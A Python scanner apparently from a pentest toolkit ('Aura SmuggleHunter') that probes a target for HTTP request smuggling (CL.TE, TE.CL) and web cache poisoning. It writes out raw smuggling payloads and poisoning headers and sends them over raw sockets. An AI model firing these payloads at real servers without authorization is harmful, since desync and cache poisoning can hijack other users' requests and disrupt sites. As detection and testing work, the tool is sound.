# -*- coding: utf-8 -*-
"""
Aura v33.0 — SmuggleHunter (HTTP Request Smuggling & Cache Poisoning) 📦
========================================================================
Advanced engine designed to detect HTTP Desync vulnerabilities (CL.TE, TE.CL)
and Web Cache Poisoning by injecting conflicting routing headers.

Attacks Implemented:
  1. CL.TE (Content-Length / Transfer-Encoding) Payload Injection.
  2. TE.CL (Transfer-Encoding / Content-Length) Payload Injection.
  3. Web Cache Poisoning via Unkeyed Headers (X-Forwarded-Host, X-Original-URL).

Note: This engine uses raw TCP/TLS sockets because Python HTTP libraries
(like requests, httpx) automatically fix/normalize malformed headers,
which destroys the smuggling payloads.
"""

import asyncio
import json
import socket
import ssl
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

from rich.console import Console

console = Console()

# ─── Low-Level Payloads ──────────────────────────────────────────────────

# Target: Front-end uses Content-Length, Back-end uses Transfer-Encoding
CL_TE_PAYLOAD = (
    "POST {path} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Connection: keep-alive\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 49\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "1\r\n"
    "Z\r\n"
    "0\r\n"
    "\r\n"
    "GET /404_smuggled_clte HTTP/1.1\r\n"
    "Foo: x"
)

# Target: Front-end uses Transfer-Encoding, Back-end uses Content-Length
TE_CL_PAYLOAD = (
    "POST {path} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Connection: keep-alive\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "5c\r\n"
    "GET /404_smuggled_tecl HTTP/1.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1\r\n"
    "0\r\n"
    "\r\n"
)

CACHE_POISONING_HEADERS = {
    "X-Forwarded-Host": "bing.com",
    "X-Host": "bing.com",
    "X-Forwarded-Server": "bing.com",
    "X-Original-URL": "/admin-poison",
    "X-Rewrite-URL": "/admin-poison",
}


class SmuggleHunter:
    """v33.0: HTTP Request Smuggling & Cache Poisoning Engine."""

    def __init__(self, target: str, output_dir: str = "./reports", timeout: int = 10):
        if not target.startswith("http"):
            target = "https://" + target
        
        self.target = target.rstrip("/")
        parsed = urllib.parse.urlparse(self.target)
        self.host = parsed.netloc
        self.path = parsed.path if parsed.path else "/"
        self.port = parsed.port if parsed.port else (443 if parsed.scheme == "https" else 80)
        self.is_https = (parsed.scheme == "https")
        self.timeout = timeout
        
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings: list[dict] = []

    async def _send_raw_request(self, payload: str, expect_timeout: bool = False) -> tuple[str, float]:
        """Sends a raw HTTP request via TCP/TLS socket to avoid library normalization."""
        response = b""
        start_time = time.time()
        
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(
                    host=self.host.split(":")[0], 
                    port=self.port, 
                    ssl=self.is_https
                ),
                timeout=5.0
            )

            writer.write(payload.encode('utf-8'))
            await writer.drain()

            try:
                # Read response chunks
                while True:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=self.timeout)
                    if not chunk:
                        break
                    response += chunk
                    if b"\r\n\r\n" in response or len(response) > 8192:
                        break # Got headers or enough body
            except asyncio.TimeoutError:
                pass # Expected for some smuggling delays

            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            return f"Socket Error: {str(e)}", time.time() - start_time

        elapsed = time.time() - start_time
        try:
            return response.decode('utf-8', errors='ignore'), elapsed
        except Exception:
            return str(response), elapsed

    async def _test_cl_te(self) -> dict | None:
        """Tests for Content-Length / Transfer-Encoding (CL.TE) Desync."""
        payload = CL_TE_PAYLOAD.format(host=self.host, path=self.path)
        
        # We send two requests. If the first request smuggles the GET /404_smuggled_clte,
        # the SECOND request we send on the SAME connection (simulated here by a follow-up)
        # will receive the 404 response meant for the smuggled prefix.
        
        # Since we use raw sockets for a single request, we look for a timeout or a 404/400
        # If the backend hangs waiting for more chunked data because the FE didn't send it,
        # that's a strong indicator of CL.TE desync.
        
        resp, elapsed = await self._send_raw_request(payload)
        
        if elapsed >= self.timeout - 1:
            return {
                "type": "HTTP Request Smuggling (CL.TE)",
                "severity": "CRITICAL",
                "impact": "Account Takeover, WAF Bypass, Cache Poisoning. The Front-end uses Content-Length and Back-end uses Transfer-Encoding.",
                "evidence": f"Server socket hung for {elapsed:.2f}s indicating backend waited for chunked data while frontend closed the stream.",
                "payload_snippet": "Content-Length: 49 \\r\\n Transfer-Encoding: chunked",
                "confirmed": True
            }
        
        if "404" in resp and "404_smuggled" in resp:
            return {
                "type": "HTTP Request Smuggling (CL.TE) - Direct Response",
                "severity": "CRITICAL",
                "impact": "Account Takeover, WAF Bypass, Cache Poisoning.",
                "evidence": "Server answered the smuggled nested request directly inside the socket stream.",
                "payload_snippet": "Content-Length: 49 \\r\\n Transfer-Encoding: chunked",
                "confirmed": True
            }
        return None

    async def _test_te_cl(self) -> dict | None:
        """Tests for Transfer-Encoding / Content-Length (TE.CL) Desync."""
        payload = TE_CL_PAYLOAD.format(host=self.host, path=self.path)
        resp, elapsed = await self._send_raw_request(payload)
        
        if elapsed >= self.timeout - 1:
            return {
                "type": "HTTP Request Smuggling (TE.CL)",
                "severity": "CRITICAL",
                "impact": "Account Takeover, WAF Bypass, Cache Poisoning. The Front-end uses Transfer-Encoding and Back-end uses Content-Length.",
                "evidence": f"Server socket hung for {elapsed:.2f}s indicating frontend waited for chunks while backend closed stream on Content-Length.",
                "payload_snippet": "Transfer-Encoding: chunked \\r\\n Content-Length: 4",
                "confirmed": True
            }
        return None

    async def _test_cache_poisoning(self) -> dict | None:
        """Injects unkeyed headers to poison the cache or bypass routes."""
        import httpx
        
        async with httpx.AsyncClient(verify=False, follow_redirects=False) as client:
            try:
                # 1. Probe for X-Forwarded-Host reflection / routing
                r1 = await client.get(self.target, headers={"X-Forwarded-Host": "bing.com"})
                
                # Check if it routed us to bing or generated a location header using bing.com
                if r1.status_code in [301, 302] and "bing.com" in r1.headers.get("Location", ""):
                    return {
                        "type": "Web Cache Poisoning (Unkeyed Header routing)",
                        "severity": "HIGH",
                        "impact": "Attackers can poison the cache so all regular users are redirected to a malicious phishing site (bing.com here).",
                        "evidence": f"X-Forwarded-Host: bing.com resulted in Location: {r1.headers.get('Location')}",
                        "payload_snippet": "X-Forwarded-Host: bing.com",
                        "confirmed": True
                    }
                
                # Check for direct reflection in body (XSS via Cache)
                if "bing.com" in r1.text:
                    return {
                        "type": "Web Cache Poisoning (Header Reflection)",
                        "severity": "MEDIUM",
                        "impact": "Header value is reflected in the body. If cached, attackers can trigger stored XSS on all visitors.",
                        "evidence": "X-Forwarded-Host reflected directly into the HTML without sanitization.",
                        "payload_snippet": "X-Forwarded-Host: bing.com",
                        "confirmed": True
                    }

            except Exception:
                pass
        return None


    # ── Main Scanner Logic ──────────────────────────────────────────────
    async def run(self) -> list[dict]:
        console.print(f"\n[bold magenta]📦 AURA v33.0 — SmuggleHunter[/bold magenta]")
        console.print(f"🎯 Target: {self.target}")
        console.print(f"  [cyan]Launching specialized TCP Sockets to bypass Header Normalization...[/cyan]")

        tasks = [
            self._test_cl_te(),
            self._test_te_cl(),
            self._test_cache_poisoning()
        ]

        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result and not isinstance(result, Exception):
                sev = result.get("severity", "HIGH")
                color = "red" if sev == "CRITICAL" else "orange1" if sev == "HIGH" else "yellow"
                console.print(f"     🚨 [{color}]{result['type']}[/{color}] Confirmed!")
                self.findings.append(result)

        self._finalize_report()
        return self.findings

    def _finalize_report(self):
        if self.findings:
            target_slug = self.host.replace(".", "_")
            out_path = self.output_dir / f"smuggle_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            with open(out_path, "w", encoding="utf-8") as f:
                json.dump({
                    "target": self.target,
                    "scan_time": datetime.utcnow().isoformat(),
                    "findings": self.findings
                }, f, indent=2)
            console.print(f"\n  💾 Smuggling Findings saved: {out_path}")
        else:
            console.print(f"\n  ✅ No HTTP Desync or Cache Poisoning vectors detected.")


def run_smuggle_scan(target: str):
    """CLI runner for direct execution."""
    engine = SmuggleHunter(target=target)
    return asyncio.run(engine.run())

if __name__ == "__main__":
    import sys
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    run_smuggle_scan(url)
